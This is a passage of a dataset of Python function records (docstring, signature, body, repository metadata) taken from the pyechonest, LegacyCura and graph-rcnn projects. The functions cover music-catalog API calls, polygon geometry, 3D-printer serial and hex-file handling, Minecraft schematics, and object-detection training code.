{"docstring": "\"\"\"\nReturns data from the catalog; also expanded for the requested buckets.\nThis method is provided for backwards-compatibility\n\nArgs:\n\nKwargs:\n    buckets (list): A list of strings specifying which buckets to retrieve\n\n    results (int): An integer number of results to return\n\n    start (int): An integer starting value for the result set\n\nReturns:\n    A list of objects in the catalog; list contains additional attributes 'start' and 'total'\n\nExample:\n\n>>> c\n<catalog - my_songs>\n>>> c.read_items(results=1)\n[<song - Harmonice Mundi II>]\n>>>\n\"\"\"\n", "func_signal": "def read_items(self, buckets=None, results=15, start=0,item_ids=None):\n", "code": "warnings.warn(\"catalog.read_items() is depreciated. Please use catalog.get_item_dicts() instead.\")\nkwargs = {}\nkwargs['bucket'] = buckets or []\nkwargs['item_id'] = item_ids or []\nresponse = self.get_attribute(\"read\", results=results, start=start, **kwargs)\nrval = ResultList([])\nif item_ids:\n    rval.start=0;\n    rval.total=len(response['catalog']['items'])\nelse:\n    rval.start = response['catalog']['start']\n    rval.total = response['catalog']['total']\nfor item in response['catalog']['items']:\n    new_item = None\n    # song items\n    if 'song_id' in item:\n        item['id'] = item.pop('song_id')\n        item['title'] = item.pop('song_name')\n        request = item['request']\n        new_item = song.Song(**util.fix(item))\n        new_item.request = request\n    # artist item\n    elif 'artist_id' in item:\n        item['id'] = item.pop('artist_id')\n        item['name'] = item.pop('artist_name')\n        request = item['request']\n        new_item = artist.Artist(**util.fix(item))\n        new_item.request = request\n    # unresolved item\n    else:\n        new_item = item\n    rval.append(new_item)\nreturn rval", "path": "pyechonest\\catalog.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nYou should not call this constructor directly, rather use the convenience functions\nthat are in track.py. For example, call track.track_from_filename\nLet's always get the bucket `audio_summary`\n\"\"\"\n", "func_signal": "def __init__(self, identifier, md5, properties):\n", "code": "super(TrackProxy, self).__init__()\nself.id = identifier\nself.md5 = md5\nself.analysis_url = None\nself._object_type = 'track'\nself.__dict__.update(properties)", "path": "pyechonest\\proxies.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nCreate a track object from an md5 hash.\n\nNOTE: Does not create the detailed analysis for the Track. Call\nTrack.get_analysis() for that.\n\nArgs:\n    md5: A string 32 characters long giving the md5 checksum of a track already analyzed.\n\nExample:\n    >>> t = track.track_from_md5('b8abf85746ab3416adabca63141d8c2d')\n    >>> t\n    <track - Neverwas Restored (from Neverwas Soundtrack)>\n    >>>\n\"\"\"\n", "func_signal": "def track_from_md5(md5, timeout=DEFAULT_ASYNC_TIMEOUT):\n", "code": "param_dict = dict(md5 = md5)\nreturn _profile(param_dict, timeout)", "path": "pyechonest\\track.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nCreate a track object from a file-like object.\n\nNOTE: Does not create the detailed analysis for the Track. Call\nTrack.get_analysis() for that.\n\nArgs:\n    file_object: a file-like Python object\n    filetype: the file type. Supported types include mp3, ogg, wav, m4a, mp4, au\n    force_upload: skip the MD5 shortcut path, force an upload+analysis\nExample:\n    >>> f = open(\"Miaow-01-Tempered-song.mp3\")\n    >>> t = track.track_from_file(f, 'mp3')\n    >>> t\n    < Track >\n    >>>\n\"\"\"\n", "func_signal": "def track_from_file(file_object, filetype, timeout=DEFAULT_ASYNC_TIMEOUT, force_upload=False):\n", "code": "if not force_upload:\n    try:\n        # Check if this file has already been uploaded.\n        # This is much faster than uploading.\n        md5 = hashlib.md5(file_object.read()).hexdigest()\n        return track_from_md5(md5)\n    except util.EchoNestAPIError:\n        # Fall through to do a fresh upload.\n        pass\n\nfile_object.seek(0)\nreturn _track_from_data(file_object.read(), filetype, timeout)", "path": "pyechonest\\track.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"\nCheck the status of a catalog update\n\nArgs:\n\nKwargs:\n\nReturns:\n    A dictionary representing ticket status\n\nExample:\n\n>>> c\n<catalog - test_song_catalog>\n>>> c.profile()\n{u'id': u'CAGPXKK12BB06F9DE9',\n u'name': u'test_song_catalog',\n u'pending_tickets': [],\n u'resolved': 2,\n u'total': 4,\n u'type': u'song'}\n>>>\n\n\"\"\"\n", "func_signal": "def get_profile(self):\n", "code": "result = self.get_attribute(\"profile\")\nreturn result['catalog']", "path": "pyechonest\\catalog.py", "repo_name": "echonest/pyechonest", "stars": 657, "license": "bsd-3-clause", "language": "python", "size": 4243}
{"docstring": "\"\"\"Calculate the minkowski hull of 2 convex polygons\"\"\"\n", "func_signal": "def minkowskiHull(a, b):\n", "code": "points = numpy.zeros((len(a) * len(b), 2))\nfor n in xrange(0, len(a)):\n\tfor m in xrange(0, len(b)):\n\t\tpoints[n * len(b) + m] = a[n] + b[m]\nreturn convexHull(points.copy())", "path": "Cura\\util\\polygon.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\" Check if convexy polygon A and B collide, return True if this is the case. \"\"\"\n", "func_signal": "def polygonCollision(polyA, polyB):\n", "code": "for n in xrange(0, len(polyA)):\n\tp0 = polyA[n-1]\n\tp1 = polyA[n]\n\tnormal = (p1 - p0)[::-1]\n\tnormal[1] = -normal[1]\n\tnormal /= numpy.linalg.norm(normal)\n\taMin, aMax = _projectPoly(polyA, normal)\n\tbMin, bMax = _projectPoly(polyB, normal)\n\tif aMin > bMax:\n\t\treturn False\n\tif bMin > aMax:\n\t\treturn False\nfor n in xrange(0, len(polyB)):\n\tp0 = polyB[n-1]\n\tp1 = polyB[n]\n\tnormal = (p1 - p0)[::-1]\n\tnormal[1] = -normal[1]\n\tnormal /= numpy.linalg.norm(normal)\n\taMin, aMax = _projectPoly(polyA, normal)\n\tbMin, bMax = _projectPoly(polyB, normal)\n\tif aMin > bMax:\n\t\treturn False\n\tif bMin > aMax:\n\t\treturn False\nreturn True", "path": "Cura\\util\\polygon.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\" Returns a pair (filters, unavailable)\nfilters is a list of (from, to) pairs;  from and to are (ID, data) pairs\nunavailable is a list of (ID, data) pairs in matsFrom not found in matsTo.\n\nSearches the 'name' and 'aka' fields to find matches.\n\"\"\"\n", "func_signal": "def guessFilterTable(matsFrom, matsTo):\n", "code": "filters = []\nunavailable = []\ntoByName = dict(((b.name, b) for b in sorted(matsTo.allBlocks, reverse=True)))\nfor fromBlock in matsFrom.allBlocks:\n    block = toByName.get(fromBlock.name)\n    if block is None:\n        for b in matsTo.allBlocks:\n            if b.name.startswith(fromBlock.name):\n                block = b\n                break\n    if block is None:\n        for b in matsTo.allBlocks:\n            if fromBlock.name in b.name:\n                block = b\n                break\n    if block is None:\n        for b in matsTo.allBlocks:\n            if fromBlock.name in b.aka:\n                block = b\n                break\n    if block is None:\n        if \"Indigo Wool\" == fromBlock.name:\n            block = toByName.get(\"Purple Wool\")\n        elif \"Violet Wool\" == fromBlock.name:\n            block = toByName.get(\"Purple Wool\")\n\n    if block:\n        if block != fromBlock:\n            filters.append(((fromBlock.ID, fromBlock.blockData), (block.ID, block.blockData)))\n    else:\n        unavailable.append((fromBlock.ID, fromBlock.blockData))\n\nreturn filters, unavailable", "path": "Cura\\util\\pymclevel\\materials.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\"\nRead an verify an intel hex file. Return the data as an list of bytes.\n\"\"\"\n", "func_signal": "def readHex(filename):\n", "code": "data = []\nextraAddr = 0\nf = io.open(filename, \"r\")\nfor line in f:\n\tline = line.strip()\n\tif len(line) < 1:\n\t\tcontinue\n\tif line[0] != ':':\n\t\traise Exception(\"Hex file has a line not starting with ':'\")\n\trecLen = int(line[1:3], 16)\n\taddr = int(line[3:7], 16) + extraAddr\n\trecType = int(line[7:9], 16)\n\tif len(line) != recLen * 2 + 11:\n\t\traise Exception(\"Error in hex file: \" + line)\n\tcheckSum = 0\n\tfor i in xrange(0, recLen + 5):\n\t\tcheckSum += int(line[i*2+1:i*2+3], 16)\n\tcheckSum &= 0xFF\n\tif checkSum != 0:\n\t\traise Exception(\"Checksum error in hex file: \" + line)\n\t\n\tif recType == 0:#Data record\n\t\twhile len(data) < addr + recLen:\n\t\t\tdata.append(0)\n\t\tfor i in xrange(0, recLen):\n\t\t\tdata[addr + i] = int(line[i*2+9:i*2+11], 16)\n\telif recType == 1:\t#End Of File record\n\t\tpass\n\telif recType == 2:\t#Extended Segment Address Record\n\t\textraAddr = int(line[9:13], 16) * 16\n\telse:\n\t\tprint(recType, recLen, addr, checkSum, line)\nf.close()\nreturn data", "path": "Cura\\avr_isp\\intelHex.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "# a filter table is a 256x16 table of (ID, data) pairs.\n", "func_signal": "def _filterTable(filters, unavailable, default=(0, 0)):\n", "code": "table = zeros((256, 16, 2), dtype='uint8')\ntable[:] = _indices\nfor u in unavailable:\n    try:\n        if u[1] == 0:\n            u = u[0]\n    except TypeError:\n        pass\n    table[u] = default\nfor f, t in filters:\n    try:\n        if f[1] == 0:\n            f = f[0]\n    except TypeError:\n        pass\n    table[f] = t\nreturn table", "path": "Cura\\util\\pymclevel\\materials.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\" Creates a chest with a stack of 'itemID' in each slot.\nOptionally specify the count of items in each stack. Pass a negative\nvalue for damage to create unnaturally sturdy tools. \"\"\"\n", "func_signal": "def chestWithItemID(cls, itemID, count=64, damage=0):\n", "code": "root_tag = nbt.TAG_Compound()\ninvTag = nbt.TAG_List()\nroot_tag[\"Inventory\"] = invTag\nfor slot in range(9, 36):\n    itemTag = nbt.TAG_Compound()\n    itemTag[\"Slot\"] = nbt.TAG_Byte(slot)\n    itemTag[\"Count\"] = nbt.TAG_Byte(count)\n    itemTag[\"id\"] = nbt.TAG_Short(itemID)\n    itemTag[\"Damage\"] = nbt.TAG_Short(damage)\n    invTag.append(itemTag)\n\nchest = INVEditChest(root_tag, \"\")\n\nreturn chest", "path": "Cura\\util\\pymclevel\\schematic.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\" Create a convex hull from a list of points. \"\"\"\n", "func_signal": "def convexHull(pointList):\n", "code": "unique = {}\nfor p in pointList:\n\tunique[p[0], p[1]] = 1\n\npoints = unique.keys()\npoints.sort()\nif len(points) < 1:\n\treturn numpy.zeros((0, 2), numpy.float32)\nif len(points) < 2:\n\treturn numpy.array(points, numpy.float32)\n\n# Build upper half of the hull.\nupper = [points[0], points[1]]\nfor p in points[2:]:\n\tupper.append(p)\n\twhile len(upper) > 2 and not _isRightTurn(upper[-3:]):\n\t\tdel upper[-2]\n\n# Build lower half of the hull.\npoints = points[::-1]\nlower = [points[0], points[1]]\nfor p in points[2:]:\n\tlower.append(p)\n\twhile len(lower) > 2 and not _isRightTurn(lower[-3:]):\n\t\tdel lower[-2]\n\n# Remove duplicates.\ndel lower[0]\ndel lower[-1]\n\nreturn numpy.array(upper + lower, numpy.float32)", "path": "Cura\\util\\polygon.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "# converts classic blocks to alpha\n# probably should only apply to alpha levels\n\n", "func_signal": "def extractZipSchematicFromIter(sourceLevel, box, zipfilename=None, entities=True):\n", "code": "if zipfilename is None:\n    zipfilename = tempfile.mktemp(\"zipschematic.zip\")\natexit.register(shutil.rmtree, zipfilename, True)\n\np = sourceLevel.adjustExtractionParameters(box)\nif p is None:\n    return\nsourceBox, destPoint = p\n\ndestPoint = (0, 0, 0)\n\ntempSchematic = ZipSchematic(zipfilename, create=True)\ntempSchematic.materials = sourceLevel.materials\n\nfor i in tempSchematic.copyBlocksFromIter(sourceLevel, sourceBox, destPoint, entities=entities, create=True):\n    yield i\n\ntempSchematic.Width, tempSchematic.Height, tempSchematic.Length = sourceBox.size\ntempSchematic.saveInPlace()  # lights not needed for this format - crashes minecraft though\nyield tempSchematic", "path": "Cura\\util\\pymclevel\\schematic.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\" Check if convex polygon A and B collide, return the vector of penetration if this is the case, else return False. \"\"\"\n", "func_signal": "def polygonCollisionPushVector(polyA, polyB):\n", "code": "retSize = 10000000.0\nret = False\nfor n in xrange(0, len(polyA)):\n\tp0 = polyA[n-1]\n\tp1 = polyA[n]\n\tnormal = (p1 - p0)[::-1]\n\tnormal[1] = -normal[1]\n\tnormal /= numpy.linalg.norm(normal)\n\taMin, aMax = _projectPoly(polyA, normal)\n\tbMin, bMax = _projectPoly(polyB, normal)\n\tif aMin > bMax:\n\t\treturn False\n\tif bMin > aMax:\n\t\treturn False\n\tsize = min(aMax, bMax) - max(aMin, bMin)\n\tif size < retSize:\n\t\tret = normal * (size + 0.1)\n\t\tretSize = size\nfor n in xrange(0, len(polyB)):\n\tp0 = polyB[n-1]\n\tp1 = polyB[n]\n\tnormal = (p1 - p0)[::-1]\n\tnormal[1] = -normal[1]\n\tnormal /= numpy.linalg.norm(normal)\n\taMin, aMax = _projectPoly(polyA, normal)\n\tbMin, bMax = _projectPoly(polyB, normal)\n\tif aMin > bMax:\n\t\treturn False\n\tif bMin > aMax:\n\t\treturn False\n\tsize = min(aMax, bMax) - max(aMin, bMin)\n\tif size < retSize:\n\t\tret = normal * -(size + 0.1)\n\t\tretSize = size\nreturn ret", "path": "Cura\\util\\polygon.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\" shape is (x,y,z) for a new level's shape.  if none, takes\nroot_tag as a TAG_Compound for an existing schematic file.  if\nnone, tries to read the tag from filename.  if none, results\nare undefined. materials can be a MCMaterials instance, or one of\n\"Classic\", \"Alpha\", \"Pocket\" to indicate allowable blocks. The default\nis Alpha.\n\nblock coordinate order in the file is y,z,x to use the same code as classic/indev levels.\nin hindsight, this was a completely arbitrary decision.\n\nthe Entities and TileEntities are nbt.TAG_List objects containing TAG_Compounds.\nthis makes it easy to copy entities without knowing about their insides.\n\nrotateLeft swaps the axes of the different arrays.  because of this, the Width, Height, and Length\nreflect the current dimensions of the schematic rather than the ones specified in the NBT structure.\nI'm not sure what happens when I try to re-save a rotated schematic.\n\"\"\"\n\n# if(shape != None):\n#    self.setShape(shape)\n\n", "func_signal": "def __init__(self, shape=None, root_tag=None, filename=None, mats='Alpha'):\n", "code": "if filename:\n    self.filename = filename\n    if None is root_tag and os.path.exists(filename):\n        root_tag = nbt.load(filename)\nelse:\n    self.filename = None\n\nif mats in namedMaterials:\n    self.materials = namedMaterials[mats]\nelse:\n    assert(isinstance(mats, MCMaterials))\n    self.materials = mats\n\nif root_tag:\n    self.root_tag = root_tag\n    if \"Materials\" in root_tag:\n        self.materials = namedMaterials[self.Materials]\n    else:\n        root_tag[\"Materials\"] = nbt.TAG_String(self.materials.name)\n    self.shapeChunkData()\n\nelse:\n    assert shape is not None\n    root_tag = nbt.TAG_Compound(name=\"Schematic\")\n    root_tag[\"Height\"] = nbt.TAG_Short(shape[1])\n    root_tag[\"Length\"] = nbt.TAG_Short(shape[2])\n    root_tag[\"Width\"] = nbt.TAG_Short(shape[0])\n\n    root_tag[\"Entities\"] = nbt.TAG_List()\n    root_tag[\"TileEntities\"] = nbt.TAG_List()\n    root_tag[\"Materials\"] = nbt.TAG_String(self.materials.name)\n\n    root_tag[\"Blocks\"] = nbt.TAG_Byte_Array(zeros((shape[1], shape[2], shape[0]), uint8))\n    root_tag[\"Data\"] = nbt.TAG_Byte_Array(zeros((shape[1], shape[2], shape[0]), uint8))\n\n    self.root_tag = root_tag\n\nself.packUnpack()\nself.root_tag[\"Data\"].value &= 0xF  # discard high bits", "path": "Cura\\util\\pymclevel\\schematic.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\"\nCheck if convex polygon A is completely inside of convex polygon B.\n\"\"\"\n", "func_signal": "def fullInside(polyA, polyB):\n", "code": "for n in xrange(0, len(polyA)):\n\tp0 = polyA[n-1]\n\tp1 = polyA[n]\n\tnormal = (p1 - p0)[::-1]\n\tnormal[1] = -normal[1]\n\tnormal /= numpy.linalg.norm(normal)\n\taMin, aMax = _projectPoly(polyA, normal)\n\tbMin, bMax = _projectPoly(polyB, normal)\n\tif aMax > bMax:\n\t\treturn False\n\tif aMin < bMin:\n\t\treturn False\nfor n in xrange(0, len(polyB)):\n\tp0 = polyB[n-1]\n\tp1 = polyB[n]\n\tnormal = (p1 - p0)[::-1]\n\tnormal[1] = -normal[1]\n\tnormal /= numpy.linalg.norm(normal)\n\taMin, aMax = _projectPoly(polyA, normal)\n\tbMin, bMax = _projectPoly(polyB, normal)\n\tif aMax > bMax:\n\t\treturn False\n\tif aMin < bMin:\n\t\treturn False\nreturn True", "path": "Cura\\util\\polygon.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\"shape is a tuple of (width, height, length).  sets the\nschematic's properties and clears the block and data arrays\"\"\"\n\n", "func_signal": "def setShape(self, shape):\n", "code": "x, y, z = shape\nshape = (x, z, y)\n\nself.root_tag[\"Blocks\"].value = zeros(dtype='uint8', shape=shape)\nself.root_tag[\"Data\"].value = zeros(dtype='uint8', shape=shape)\nself.shapeChunkData()", "path": "Cura\\util\\pymclevel\\schematic.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\"\nBuild a gcodePath object. This used to be objects, however, this code is timing sensitive and dictionaries proved to be faster.\n\"\"\"\n", "func_signal": "def gcodePath(newType, pathType, layerThickness, startPoint):\n", "code": "if layerThickness <= 0.0:\n\tlayerThickness = 0.01\nif profile.getProfileSetting('spiralize') == 'True':\n\tlayerThickness = profile.getProfileSettingFloat('layer_height')\nreturn {'type': newType,\n\t\t'pathType': pathType,\n\t\t'layerThickness': layerThickness,\n\t\t'points': [startPoint],\n\t\t'extrusion': [0.0]}", "path": "Cura\\util\\gcodeInterpreter.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\" Return the intersection of the infinite line trough points p0 and p1 and infinite line trough points p2 and p3. \"\"\"\n", "func_signal": "def lineLineIntersection(p0, p1, p2, p3):\n", "code": "A1 = p1[1] - p0[1]\nB1 = p0[0] - p1[0]\nC1 = A1*p0[0] + B1*p0[1]\n\nA2 = p3[1] - p2[1]\nB2 = p2[0] - p3[0]\nC2 = A2 * p2[0] + B2 * p2[1]\n\ndet = A1*B2 - A2*B1\nif det == 0:\n\treturn p0\nreturn [(B2*C1 - B1*C2)/det, (A1 * C2 - A2 * C1) / det]", "path": "Cura\\util\\polygon.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "#Calculates the weight of the filament in kg\n", "func_signal": "def calculateWeight(self):\n", "code": "radius = float(profile.getProfileSetting('filament_diameter')) / 2\nvolumeM3 = (self.extrusionAmount * (math.pi * radius * radius)) / (1000*1000*1000)\nreturn volumeM3 * profile.getPreferenceFloat('filament_physical_density')", "path": "Cura\\util\\gcodeInterpreter.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\"\nProject a convex polygon on a given normal.\nA projection of a convex polygon on a infinite line is a finite line.\nGive the min and max value on the normal line.\n\"\"\"\n", "func_signal": "def _projectPoly(poly, normal):\n", "code": "pMin = numpy.dot(normal, poly[0])\npMax = pMin\nfor n in xrange(1 , len(poly)):\n\tp = numpy.dot(normal, poly[n])\n\tpMin = min(pMin, p)\n\tpMax = max(pMax, p)\nreturn pMin, pMax", "path": "Cura\\util\\polygon.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\"\n\tRetrieve a list of serial ports found in the system.\n:param forAutoDetect: if true then only the USB serial ports are listed. Else all ports are listed.\n:return: A list of strings where each string is a serial port.\n\"\"\"\n", "func_signal": "def serialList(forAutoDetect=False):\n", "code": "baselist=[]\nif platform.system() == \"Windows\":\n\ttry:\n\t\tkey=_winreg.OpenKey(_winreg.HKEY_LOCAL_MACHINE,\"HARDWARE\\\\DEVICEMAP\\\\SERIALCOMM\")\n\t\ti=0\n\t\twhile True:\n\t\t\tvalues = _winreg.EnumValue(key, i)\n\t\t\tif not forAutoDetect or 'USBSER' in values[0]:\n\t\t\t\tbaselist+=[values[1]]\n\t\t\ti+=1\n\texcept:\n\t\tpass\nif forAutoDetect:\n\tbaselist = baselist + glob.glob('/dev/ttyUSB*') + glob.glob('/dev/ttyACM*') + glob.glob(\"/dev/cu.usb*\")\n\tbaselist = filter(lambda s: not 'Bluetooth' in s, baselist)\n\tprev = profile.getMachineSetting('serial_port_auto')\n\tif prev in baselist:\n\t\tbaselist.remove(prev)\n\t\tbaselist.insert(0, prev)\nelse:\n\tbaselist = baselist + glob.glob('/dev/ttyUSB*') + glob.glob('/dev/ttyACM*') + glob.glob(\"/dev/cu.*\") + glob.glob(\"/dev/tty.usb*\") + glob.glob(\"/dev/rfcomm*\") + glob.glob('/dev/serial/by-id/*')\nif version.isDevVersion() and not forAutoDetect:\n\tbaselist.append('VIRTUAL')\nreturn baselist", "path": "Cura\\util\\machineCom.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\" Let's be magic. If we get a string, return the first block whose\n    name matches exactly. If we get a (id, data) pair or an id, return\n    that block. for example:\n\n        level.materials[0]  # returns Air\n        level.materials[\"Air\"]  # also returns Air\n        level.materials[\"Powered Rail\"]  # returns Powered Rail\n        level.materials[\"Lapis Lazuli Block\"]  # in Classic\n\n   \"\"\"\n", "func_signal": "def __getitem__(self, key):\n", "code": "if isinstance(key, basestring):\n    for b in self.allBlocks:\n        if b.name == key:\n            return b\n    raise KeyError(\"No blocks named: \" + key)\nif isinstance(key, (tuple, list)):\n    id, blockData = key\n    return self.blockWithID(id, blockData)\nreturn self.blockWithID(key)", "path": "Cura\\util\\pymclevel\\materials.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "\"\"\" Cut the convex polygon 0 so that it completely fits in convex polygon 1, any part sticking out of polygon 1 is cut off \"\"\"\n", "func_signal": "def clipConvex(poly0, poly1):\n", "code": "res = poly0\nfor p1idx in xrange(0, len(poly1)):\n\tsrc = res\n\tres = []\n\tp0 = poly1[p1idx-1]\n\tp1 = poly1[p1idx]\n\tfor n in xrange(0, len(src)):\n\t\tp = src[n]\n\t\tif not _isLeft(p0, p1, p):\n\t\t\tif _isLeft(p0, p1, src[n-1]):\n\t\t\t\tres.append(lineLineIntersection(p0, p1, src[n-1], p))\n\t\t\tres.append(p)\n\t\telif not _isLeft(p0, p1, src[n-1]):\n\t\t\tres.append(lineLineIntersection(p0, p1, src[n-1], p))\nreturn numpy.array(res, numpy.float32)", "path": "Cura\\util\\polygon.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "#Default to english\n", "func_signal": "def setupLocalization(selectedLanguage = None):\n", "code": "languages = ['en']\n\nif selectedLanguage is not None:\n\tfor item in getLanguageOptions():\n\t\tif item[1] == selectedLanguage and item[0] is not None:\n\t\t\tlanguages = [item[0]]\n\nlocale_path = os.path.normpath(os.path.join(resourceBasePath, 'locale'))\ntranslation = gettext.translation('Cura', locale_path, languages, fallback=True)\n#translation.ugettext = lambda message: u'#' + message\ntranslation.install(unicode=True)", "path": "Cura\\util\\resources.py", "repo_name": "daid/LegacyCura", "stars": 588, "license": "None", "language": "python", "size": 77536}
{"docstring": "# assert isinstance(dataset, COCODataset)\n", "func_signal": "def prepare_for_coco_keypoint(predictions, dataset):\n", "code": "coco_results = []\nfor image_id, prediction in enumerate(predictions):\n    original_id = dataset.id_to_img_map[image_id]\n    if len(prediction.bbox) == 0:\n        continue\n\n    # TODO replace with get_img_info?\n    image_width = dataset.coco.imgs[original_id]['width']\n    image_height = dataset.coco.imgs[original_id]['height']\n    prediction = prediction.resize((image_width, image_height))\n    prediction = prediction.convert('xywh')\n\n    boxes = prediction.bbox.tolist()\n    scores = prediction.get_field('scores').tolist()\n    labels = prediction.get_field('labels').tolist()\n    keypoints = prediction.get_field('keypoints')\n    keypoints = keypoints.resize((image_width, image_height))\n    keypoints = keypoints.keypoints.view(keypoints.keypoints.shape[0], -1).tolist()\n\n    mapped_labels = [dataset.contiguous_category_id_to_json_id[i] for i in labels]\n\n    coco_results.extend([{\n        'image_id': original_id,\n        'category_id': mapped_labels[k],\n        'keypoints': keypoint,\n        'score': scores[k]} for k, keypoint in enumerate(keypoints)])\nreturn coco_results", "path": "lib\\scene_parser\\rcnn\\data\\datasets\\evaluation\\coco\\coco_eval.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\"\nTranspose bounding box (flip or rotate in 90 degree steps)\n:param method: One of :py:attr:`PIL.Image.FLIP_LEFT_RIGHT`,\n  :py:attr:`PIL.Image.FLIP_TOP_BOTTOM`, :py:attr:`PIL.Image.ROTATE_90`,\n  :py:attr:`PIL.Image.ROTATE_180`, :py:attr:`PIL.Image.ROTATE_270`,\n  :py:attr:`PIL.Image.TRANSPOSE` or :py:attr:`PIL.Image.TRANSVERSE`.\n\"\"\"\n", "func_signal": "def transpose(self, method):\n", "code": "if method not in (FLIP_LEFT_RIGHT, FLIP_TOP_BOTTOM):\n    raise NotImplementedError(\n        \"Only FLIP_LEFT_RIGHT and FLIP_TOP_BOTTOM implemented\"\n    )\n\nimage_width, image_height = self.size\nxmin, ymin, xmax, ymax = self._split_into_xyxy()\nif method == FLIP_LEFT_RIGHT:\n    TO_REMOVE = 1\n    transposed_xmin = image_width - xmax - TO_REMOVE\n    transposed_xmax = image_width - xmin - TO_REMOVE\n    transposed_ymin = ymin\n    transposed_ymax = ymax\nelif method == FLIP_TOP_BOTTOM:\n    transposed_xmin = xmin\n    transposed_xmax = xmax\n    transposed_ymin = image_height - ymax\n    transposed_ymax = image_height - ymin\n\ntransposed_boxes = torch.cat(\n    (transposed_xmin, transposed_ymin, transposed_xmax, transposed_ymax), dim=-1\n)\nbbox = BoxPairList(transposed_boxes, self.size, mode=\"xyxy\")\n# bbox._copy_extra_fields(self)\nfor k, v in self.extra_fields.items():\n    if not isinstance(v, torch.Tensor):\n        v = v.transpose(method)\n    bbox.add_field(k, v)\nreturn bbox.convert(self.mode)", "path": "lib\\scene_parser\\rcnn\\structures\\bounding_box_pair.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "# if it's empty, there is no annotation\n", "func_signal": "def has_valid_annotation(anno):\n", "code": "if len(anno) == 0:\n    return False\n# if all boxes have close to zero area, there is no annotation\nif _has_only_empty_bbox(anno):\n    return False\n# keypoints task have a slight different critera for considering\n# if an annotation is valid\nif \"keypoints\" not in anno[0]:\n    return True\n# for keypoint detection tasks, only consider valid images those\n# containing at least min_keypoints_per_image\nif _count_visible_keypoints(anno) >= min_keypoints_per_image:\n    return True\nreturn False", "path": "lib\\scene_parser\\rcnn\\data\\datasets\\coco.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\"\nArguments:\n    cfg              : config\n    in_channels (int): number of channels of the input feature\n    num_anchors (int): number of anchors to be predicted\n\"\"\"\n", "func_signal": "def __init__(self, cfg, in_channels, num_anchors):\n", "code": "super(RPNHead, self).__init__()\nself.conv = nn.Conv2d(\n    in_channels, in_channels, kernel_size=3, stride=1, padding=1\n)\nself.cls_logits = nn.Conv2d(in_channels, num_anchors, kernel_size=1, stride=1)\nself.bbox_pred = nn.Conv2d(\n    in_channels, num_anchors * 4, kernel_size=1, stride=1\n)\n\nfor l in [self.conv, self.cls_logits, self.bbox_pred]:\n    torch.nn.init.normal_(l.weight, std=0.01)\n    torch.nn.init.constant_(l.bias, 0)", "path": "lib\\scene_parser\\rcnn\\modeling\\rpn\\rpn.py", "repo_name": "jwyang/graph-rcnn.pytorch", "stars": 695, "license": "None", "language": "python", "size": 1482}
{"docstring": "\"\"\"\nmain body for training scene graph generation model\n\"\"\"\n", "func_signal": "def train(self):\n", "code": "start_iter = self.arguments[\"iteration\"]\nlogger = logging.getLogger(\"scene_graph_generation.trainer\")\nlogger.info(\"Start training\")\nmeters = MetricLogger(delimiter=\"  \")\nmax_iter = len(self.data_loader_train)\nself.scene_parser.train()\nstart_training_time = time.time()\nend = time.time()\nfor i, data in enumerate(self.data_loader_train, start_iter):\n    data_time = time.time() - end\n    self.arguments[\"iteration\"] = i\n    self.sp_scheduler.step()\n    imgs, targets, _ = data\n    imgs = imgs.to(self.device); targets = [target.to(self.device) for target in targets]\n    loss_dict = self.scene_parser(imgs, targets)\n    losses = sum(loss for loss in loss_dict.values())\n\n    # reduce losses over all GPUs for logging purposes\n    loss_dict_reduced = loss_dict\n    losses_reduced = sum(loss for loss in loss_dict_reduced.values())\n    meters.update(loss=losses_reduced, **loss_dict_reduced)\n\n    self.sp_optimizer.zero_grad()\n    losses.backward()\n    self.sp_optimizer.step()\n\n    batch_time = time.time() - end\n    end = time.time()\n    meters.update(time=batch_time, data=data_time)\n\n    eta_seconds = 